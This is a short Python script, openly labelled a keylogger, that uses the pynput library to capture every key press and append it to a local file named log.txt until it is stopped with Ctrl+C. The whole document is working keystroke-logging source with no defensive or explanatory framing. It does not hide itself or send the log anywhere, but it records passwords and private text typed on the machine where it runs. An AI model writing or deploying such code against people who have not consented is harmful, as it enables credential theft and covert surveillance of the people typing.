from pynput.keyboard import Listener

# Function to log keystrokes
def log_keystrokes(key):
    key = str(key).replace("'", "") # Clean up key format
    with open("log.txt", "a") as log_file:
          log_file.write(key + "\n") # Write the key to the log file
    
# Function to start listening to keystrokes
def start_logging():
     with Listener(on_press=log_keystrokes) as listener:
          listener.join() # Start the listener
        
if __name__ == "__main__":
     print("[+] Keylogger is running... (press CRTL + C to stop)")
     start_logging()
